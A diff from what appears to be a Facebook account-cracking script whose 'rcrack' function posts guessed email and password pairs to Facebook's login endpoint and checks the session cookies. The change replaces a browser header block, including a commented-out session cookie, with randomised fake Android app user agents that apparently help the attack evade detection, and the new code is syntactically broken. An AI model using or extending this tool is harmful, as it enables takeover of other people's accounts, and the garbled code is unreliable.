@@ -1160,26 +1160,24 @@ def rcrack(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-header = 'x.facebook.com',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
-            'cache-control': 'max-age=0',
-            # 'cookie': 'datr=PQLuZMBscF1qkGASlG2isZaV; sb=PQLuZHpi0wGOFBTtuH49uwAQ; m_pixel_ratio=2.1988937854766846; x-referer=eyJyIjoiL2Jvb2ttYXJrcy8%2FcGFpcHY9MCZlYXY9QWZhV1dCd0NUOXNScGYwcms2ZWxobWRsSHMySkNnQzZkenZlRkloWEgtU2YxSzRFNE94NVVrTkxWM2lVby1XQTVnYyIsImgiOiIvYm9va21hcmtzLz9wYWlwdj0wJmVhdj1BZmFXV0J3Q1Q5c1JwZjByazZlbGhtZGxIczJKQ2dDNmR6dmVGSWhYSC1TZjFLNEU0T3g1VWtOTFYzaVVvLVdBNWdjIiwicyI6IngifQ%3D%3D; dpr=2.1988937854766846; wd=891x1753; fr=0I0cCcKW3527D1HI6.AWWIpW5d2pPJdw-s6crLlaKzMvk.Bk8t0F.EL.AAA.0.0.Bk8t2A.AWVqqNEkRvk',
-            'dpr': '2',
-            'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-model': '""',
-            'sec-ch-ua-platform': '"Linux"',
-            'sec-ch-ua-platform-version': '""',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
-            'viewport-width': '980',
+header = 'dalvik_version = ["Dalvik/2.1.0"]
+android_version = ["Android 10", "Android 11", "Android 12"]
+device_make = ["Samsung", "Nokia", "Google Pixel", "OnePlus"]
+app_version = ["FBAV/409.0.0.27.106", "FBAV/410.0.0.28.107", "FBAV/411.0.0.29.108"]
+locale = ["en_US", "en_UK", "fr_FR", "es_ES"]
+screen_resolution = ["1080x1920", "720x1280", "1440x2560"]
+facebook_build = ["FB4A", "FB4B", "FB4C"]
+processor_architecture = ["armeabi-v7a", "arm64-v8a", "x86"]
+facebook_fw_version = ["FB_FW/1", "FB_FW/2"]
+random_density = random.uniform(1.0, 3.0)  # Generate a random density value
+random_width = random.randint(320, 1440)   # Generate a random width value
+random_height = random.randint(480, 2560)  # Generate a random height value
+
+# Randomly select values for each part of the user agent
+user_agent = f"{random.choice(dalvik_version)} (Linux; U; {random.choice(android_version)}; {random.choice(device_make)} Build/{random.randint(1, 999999)}.001) " \
+             f"[FBAN/{random.choice(facebook_build)};{random.choice(app_version)};FBPN/com.facebook.katana;FBLC/{random.choice(locale)};" \
+             f"FBBV/{random.randint(1, 999999)};FBCR/{random.choice(['AT&T', 'Verizon', 'T-Mobile'])};FBMF/{random.choice(device_make)};FBBD/{random.choice(device_make)};" \
+             f"FBDV/{random.choice(['Nokia0', 'Nokia1', 'Nokia2'])};FBSV/11;FBCA/{random.choice(processor_architecture)};FBDM/{{density={random_density:.2f},width={random_width},height={random_height}}};{random.choice(facebook_fw_version)};FBRV/{random.randint(1, 999999)}}]"
 			lo = session.post('https://x.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			
